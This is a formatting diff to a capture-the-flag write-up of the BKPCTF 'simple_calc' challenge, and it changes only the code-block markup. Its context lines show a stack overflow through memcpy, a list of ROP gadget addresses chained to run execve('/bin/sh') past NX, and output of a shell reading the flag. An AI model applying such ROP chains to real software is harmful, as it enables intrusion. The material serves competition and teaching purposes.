@@ -38,7 +38,7 @@ which take in 2 DWORD operands, and apply the function. What is worth noticing i
 both operands and result are stored in the `.bss` (therefore at predictable
 addresses).
 
-```
+{% highlight text %}
 [...]
 .bss:00000000006C4A84 add_operator_2  dd ?                    ; DATA XREF: adds+40
 .bss:00000000006C4A84                                         ; adds+69 ...
@@ -52,7 +52,7 @@ addresses).
 .bss:00000000006C4A94                                         ; divs+69 ...
 .bss:00000000006C4A98 div_result      dd ?                    ; DATA XREF: divs+9B
 [...]
-```
+{% endhighlight %}
 
 By exiting, `simple_calc` performs a `memcpy()` of the malloc-ed buffer (whose
 length is controlled by us) into a stack buffer (of length 0x28 bytes) located
@@ -124,7 +124,7 @@ def pwn(s):
 
 We try again, and we hit the SIGSEGV in the RET. Perfect, time to bypass NX.
 
-```
+{% highlight text %}
 Program received signal SIGSEGV, Segmentation fault.
 [...]
 0x40157c	 <main+505>  mov    edi,eax
@@ -134,7 +134,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x401589	 <main+518>  ret 		 ← $pc
 0x40158a	 nop    WORD PTR [rax+rax*1+0x0]
 0x401590	 <__libc_start_main>  push   r14
-```
+{% endhighlight %}
 
 We want to have a shell (what else, right?) so we need all the gadgets to
 syscall execve('/bin/sh', 0, 0).
@@ -144,7 +144,7 @@ writable address, and write '/bin//sh' (we arbitrarily chose 0x6c3110 in the
 `.bss`). Using [`ropgadget`](https://github.com/JonathanSalwan/ROPgadget) makes
 it easier than ever:
 
-```
+{% highlight text %}
 0x401c87:                  # pop rsi ; ret
 0x6c3110:                  # our writable address
 0x44db34:                  # pop rax ; ret
@@ -152,7 +152,7 @@ it easier than ever:
 0x470f11                   # mov qword ptr [rsi], rax ; ret
 0x447233:                  # mov    rax,rsi; ret
 0x479295                   # mov edi, eax ; dec dword ptr [rax - 0x77] ; ret
-```
+{% endhighlight %}
 
 At this stage, we have `/bin//sh` written @0x6c3110 and this address inside the
 EDI register. Then we can use the gadget `0x437aa9: pop rdx ; pop rsi ; ret` to populate RSI and
@@ -195,7 +195,7 @@ def pwn(s):
 
 Run and pwn !
 
-```bash
+{% highlight bash %}
 /cur/simple_calc $ ./simple_calc.py                                                                                                                                         [23:36]
 [+] Connected to localhost:5400
 [+] Running 45 calculations
@@ -215,6 +215,6 @@ key
 simple_calc
 cat key
 BKPCTF{what_is_2015_minus_7547}
-```
+{% endhighlight %}
 
 The full exploit is [here](https://gist.github.com/hugsy/88e7137466505e0402ca).
